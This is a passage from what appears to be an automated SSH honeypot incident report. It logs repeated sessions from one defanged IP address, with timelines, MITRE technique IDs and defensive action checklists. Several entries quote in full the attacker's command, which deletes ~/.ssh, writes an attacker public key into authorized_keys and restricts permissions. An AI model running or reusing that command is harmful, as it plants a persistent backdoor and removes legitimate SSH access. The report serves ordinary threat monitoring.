| `2026-05-06 16:22:11` | `cowrie.command.input` |
| `2026-05-06 16:22:12` | `cowrie.session.file_download` |
| `2026-05-06 16:22:12` | `cowrie.log.closed` |
| `2026-05-06 16:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27e726257542

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:22 |
| **Last Seen** | 2026-05-06 16:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:22:14` | `cowrie.session.connect` |
| `2026-05-06 16:22:14` | `cowrie.client.version` |
| `2026-05-06 16:22:14` | `cowrie.client.kex` |
| `2026-05-06 16:22:15` | `cowrie.login.success` |
| `2026-05-06 16:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a6322d9817

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:23 |
| **Last Seen** | 2026-05-06 16:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:23:47` | `cowrie.session.connect` |
| `2026-05-06 16:23:47` | `cowrie.client.version` |
| `2026-05-06 16:23:47` | `cowrie.client.kex` |
| `2026-05-06 16:23:48` | `cowrie.login.success` |
| `2026-05-06 16:23:49` | `cowrie.session.params` |
| `2026-05-06 16:23:49` | `cowrie.command.input` |
| `2026-05-06 16:23:49` | `cowrie.command.failed` |
| `2026-05-06 16:23:49` | `cowrie.log.closed` |
| `2026-05-06 16:23:49` | `cowrie.session.params` |
| `2026-05-06 16:23:49` | `cowrie.command.input` |
| `2026-05-06 16:23:49` | `cowrie.session.file_download` |
| `2026-05-06 16:23:49` | `cowrie.log.closed` |
| `2026-05-06 16:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18616dc46783

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:23 |
| **Last Seen** | 2026-05-06 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:23:52` | `cowrie.session.connect` |
| `2026-05-06 16:23:52` | `cowrie.client.version` |
| `2026-05-06 16:23:52` | `cowrie.client.kex` |
| `2026-05-06 16:23:53` | `cowrie.login.success` |
| `2026-05-06 16:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2027677cd565

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:24 |
| **Last Seen** | 2026-05-06 16:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:24:34` | `cowrie.session.connect` |
| `2026-05-06 16:24:34` | `cowrie.client.version` |
| `2026-05-06 16:24:35` | `cowrie.client.kex` |
| `2026-05-06 16:24:35` | `cowrie.login.success` |
| `2026-05-06 16:24:36` | `cowrie.session.params` |
| `2026-05-06 16:24:36` | `cowrie.command.input` |
| `2026-05-06 16:24:36` | `cowrie.command.failed` |
| `2026-05-06 16:24:36` | `cowrie.log.closed` |
| `2026-05-06 16:24:36` | `cowrie.session.params` |
| `2026-05-06 16:24:36` | `cowrie.command.input` |
| `2026-05-06 16:24:36` | `cowrie.session.file_download` |
| `2026-05-06 16:24:36` | `cowrie.log.closed` |
| `2026-05-06 16:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef6e0d2aa07

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:24 |
| **Last Seen** | 2026-05-06 16:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:24:39` | `cowrie.session.connect` |
| `2026-05-06 16:24:39` | `cowrie.client.version` |
| `2026-05-06 16:24:39` | `cowrie.client.kex` |
| `2026-05-06 16:24:40` | `cowrie.login.success` |
| `2026-05-06 16:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56da5196339c

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:25 |
| **Last Seen** | 2026-05-06 16:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:25:20` | `cowrie.session.connect` |
| `2026-05-06 16:25:20` | `cowrie.client.version` |
| `2026-05-06 16:25:21` | `cowrie.client.kex` |
| `2026-05-06 16:25:21` | `cowrie.login.success` |
| `2026-05-06 16:25:22` | `cowrie.session.params` |
| `2026-05-06 16:25:22` | `cowrie.command.input` |
| `2026-05-06 16:25:22` | `cowrie.command.failed` |
| `2026-05-06 16:25:22` | `cowrie.log.closed` |
| `2026-05-06 16:25:22` | `cowrie.session.params` |
| `2026-05-06 16:25:22` | `cowrie.command.input` |
| `2026-05-06 16:25:23` | `cowrie.session.file_download` |
| `2026-05-06 16:25:23` | `cowrie.log.closed` |
| `2026-05-06 16:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e6981424e44

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:25 |
| **Last Seen** | 2026-05-06 16:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:25:25` | `cowrie.session.connect` |
| `2026-05-06 16:25:25` | `cowrie.client.version` |
| `2026-05-06 16:25:25` | `cowrie.client.kex` |
| `2026-05-06 16:25:26` | `cowrie.login.success` |
| `2026-05-06 16:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e627d1dc118

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:26 |
| **Last Seen** | 2026-05-06 16:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:26:07` | `cowrie.session.connect` |
| `2026-05-06 16:26:07` | `cowrie.client.version` |
| `2026-05-06 16:26:08` | `cowrie.client.kex` |
| `2026-05-06 16:26:08` | `cowrie.login.success` |
| `2026-05-06 16:26:09` | `cowrie.session.params` |
| `2026-05-06 16:26:09` | `cowrie.command.input` |
| `2026-05-06 16:26:09` | `cowrie.command.failed` |
| `2026-05-06 16:26:09` | `cowrie.log.closed` |
| `2026-05-06 16:26:09` | `cowrie.session.params` |
| `2026-05-06 16:26:09` | `cowrie.command.input` |
| `2026-05-06 16:26:09` | `cowrie.session.file_download` |
| `2026-05-06 16:26:09` | `cowrie.log.closed` |
| `2026-05-06 16:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1682c455f0b

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:26 |
| **Last Seen** | 2026-05-06 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:26:12` | `cowrie.session.connect` |
| `2026-05-06 16:26:12` | `cowrie.client.version` |
| `2026-05-06 16:26:12` | `cowrie.client.kex` |
| `2026-05-06 16:26:13` | `cowrie.login.success` |
| `2026-05-06 16:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9390b9db462d

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:26 |
| **Last Seen** | 2026-05-06 16:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:26:54` | `cowrie.session.connect` |
| `2026-05-06 16:26:54` | `cowrie.client.version` |
| `2026-05-06 16:26:54` | `cowrie.client.kex` |
| `2026-05-06 16:26:55` | `cowrie.login.success` |
| `2026-05-06 16:26:56` | `cowrie.session.params` |
| `2026-05-06 16:26:56` | `cowrie.command.input` |
| `2026-05-06 16:26:56` | `cowrie.command.failed` |
| `2026-05-06 16:26:56` | `cowrie.log.closed` |
| `2026-05-06 16:26:56` | `cowrie.session.params` |
| `2026-05-06 16:26:56` | `cowrie.command.input` |
| `2026-05-06 16:26:56` | `cowrie.session.file_download` |
| `2026-05-06 16:26:56` | `cowrie.log.closed` |
| `2026-05-06 16:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ead3e474da

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:26 |
| **Last Seen** | 2026-05-06 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:26:59` | `cowrie.session.connect` |
| `2026-05-06 16:26:59` | `cowrie.client.version` |
| `2026-05-06 16:26:59` | `cowrie.client.kex` |
| `2026-05-06 16:27:00` | `cowrie.login.success` |
| `2026-05-06 16:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36e2a2d42e08

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:27 |
| **Last Seen** | 2026-05-06 16:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:27:43` | `cowrie.session.connect` |
| `2026-05-06 16:27:43` | `cowrie.client.version` |
| `2026-05-06 16:27:43` | `cowrie.client.kex` |
| `2026-05-06 16:27:44` | `cowrie.login.success` |
| `2026-05-06 16:27:44` | `cowrie.session.params` |
| `2026-05-06 16:27:44` | `cowrie.command.input` |
| `2026-05-06 16:27:44` | `cowrie.command.failed` |
| `2026-05-06 16:27:44` | `cowrie.log.closed` |
| `2026-05-06 16:27:45` | `cowrie.session.params` |
| `2026-05-06 16:27:45` | `cowrie.command.input` |
| `2026-05-06 16:27:45` | `cowrie.session.file_download` |
| `2026-05-06 16:27:45` | `cowrie.log.closed` |
| `2026-05-06 16:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2315729d6ea

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:27 |
| **Last Seen** | 2026-05-06 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:27:47` | `cowrie.session.connect` |
| `2026-05-06 16:27:47` | `cowrie.client.version` |
| `2026-05-06 16:27:48` | `cowrie.client.kex` |
| `2026-05-06 16:27:48` | `cowrie.login.success` |
| `2026-05-06 16:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c2a28b1be5

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:28 |
| **Last Seen** | 2026-05-06 16:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:28:32` | `cowrie.session.connect` |
| `2026-05-06 16:28:32` | `cowrie.client.version` |
| `2026-05-06 16:28:32` | `cowrie.client.kex` |
| `2026-05-06 16:28:33` | `cowrie.login.success` |
| `2026-05-06 16:28:34` | `cowrie.session.params` |
| `2026-05-06 16:28:34` | `cowrie.command.input` |
| `2026-05-06 16:28:34` | `cowrie.command.failed` |
| `2026-05-06 16:28:34` | `cowrie.log.closed` |
| `2026-05-06 16:28:34` | `cowrie.session.params` |
| `2026-05-06 16:28:34` | `cowrie.command.input` |
| `2026-05-06 16:28:34` | `cowrie.session.file_download` |
| `2026-05-06 16:28:34` | `cowrie.log.closed` |
| `2026-05-06 16:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80f0c6162f63

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:28 |
| **Last Seen** | 2026-05-06 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:28:37` | `cowrie.session.connect` |
| `2026-05-06 16:28:37` | `cowrie.client.version` |
| `2026-05-06 16:28:37` | `cowrie.client.kex` |
| `2026-05-06 16:28:38` | `cowrie.login.success` |
| `2026-05-06 16:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a7f29c0ecc

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:29 |
| **Last Seen** | 2026-05-06 16:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:29:22` | `cowrie.session.connect` |
| `2026-05-06 16:29:22` | `cowrie.client.version` |
| `2026-05-06 16:29:22` | `cowrie.client.kex` |
| `2026-05-06 16:29:23` | `cowrie.login.success` |
| `2026-05-06 16:29:23` | `cowrie.session.params` |
| `2026-05-06 16:29:23` | `cowrie.command.input` |
| `2026-05-06 16:29:23` | `cowrie.command.failed` |
| `2026-05-06 16:29:23` | `cowrie.log.closed` |
| `2026-05-06 16:29:24` | `cowrie.session.params` |
| `2026-05-06 16:29:24` | `cowrie.command.input` |
| `2026-05-06 16:29:24` | `cowrie.session.file_download` |
| `2026-05-06 16:29:24` | `cowrie.log.closed` |
| `2026-05-06 16:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0492028936f

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:29 |
| **Last Seen** | 2026-05-06 16:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:29:27` | `cowrie.session.connect` |
| `2026-05-06 16:29:27` | `cowrie.client.version` |
| `2026-05-06 16:29:27` | `cowrie.client.kex` |
| `2026-05-06 16:29:28` | `cowrie.login.success` |
| `2026-05-06 16:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86faa891b7f9

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:31 |
| **Last Seen** | 2026-05-06 16:31 |
| **Session Duration** | 5s |
